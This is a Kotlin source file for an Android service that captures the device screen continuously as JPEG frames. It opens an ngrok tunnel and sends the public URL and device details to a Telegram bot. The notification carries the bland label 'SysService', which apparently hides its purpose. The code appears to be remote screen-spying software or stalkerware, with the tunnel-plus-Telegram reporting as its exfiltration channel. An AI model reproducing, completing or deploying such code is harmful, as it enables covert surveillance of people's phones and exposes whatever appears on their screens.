package com.dec.screencapserver

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat

class ScreenCaptureService : Service() {

    private lateinit var mediaProjection: MediaProjection
    private lateinit var virtualDisplay: VirtualDisplay
    private lateinit var imageReader: ImageReader
    private lateinit var captureHandler: Handler
    private lateinit var captureThread: HandlerThread
    private lateinit var tunnelManager: TunnelManager
    private lateinit var telegram: TelegramNotifier

    private var screenWidth  = 0
    private var screenHeight = 0
    private var screenDensity = 0

    companion object {
        const val CHANNEL_ID = "cap_service"

        @Volatile var latestJpeg: ByteArray? = null
        @Volatile var frameTimestamp: Long   = 0L
        @Volatile var frameCount: Long       = 0L
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        (getSystemService(WINDOW_SERVICE) as WindowManager)
            .defaultDisplay.getMetrics(metrics)
        screenWidth   = metrics.widthPixels
        screenHeight  = metrics.heightPixels
        screenDensity = metrics.densityDpi

        captureThread = HandlerThread("CaptureThread").also { it.start() }
        captureHandler = Handler(captureThread.looper)

        telegram = TelegramNotifier(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
        tunnelManager = TunnelManager(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotification())

        val resultCode = intent?.getIntExtra("resultCode", -1) ?: return START_NOT_STICKY
        val data = intent.getParcelableExtra<Intent>("data") ?: return START_NOT_STICKY

        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpm.getMediaProjection(resultCode, data)

        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "CapDisplay",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        scheduleCaptureLoop()

        // Start ngrok tunnel → send URL to Telegram
        tunnelManager.onUrlReady = { url ->
            val device = "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
            telegram.sendUrl(url, device)
            (applicationContext as? MainActivity)?.updateStatus("🟢 Live: $url")
        }
        tunnelManager.start()

        return START_STICKY
    }

    private fun scheduleCaptureLoop() {
        captureHandler.post(object : Runnable {
            override fun run() {
                captureFrame()
                captureHandler.postDelayed(this, Config.CAPTURE_INTERVAL_MS)
            }
        })
    }

    private fun captureFrame() {
        val image = imageReader.acquireLatestImage() ?: return
        try {
            val planes     = image.planes
            val buffer     = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * screenWidth

            val bmp = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = Bitmap.createBitmap(bmp, 0, 0, screenWidth, screenHeight)
            bmp.recycle()

            val baos = java.io.ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 75, baos)
            cropped.recycle()

            latestJpeg     = baos.toByteArray()
            frameTimestamp = System.currentTimeMillis()
            frameCount++
        } finally {
            image.close()
        }
    }

    override fun onDestroy() {
        captureThread.quitSafely()
        virtualDisplay.release()
        mediaProjection.stop()
        tunnelManager.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SysService")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Capture", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }
}
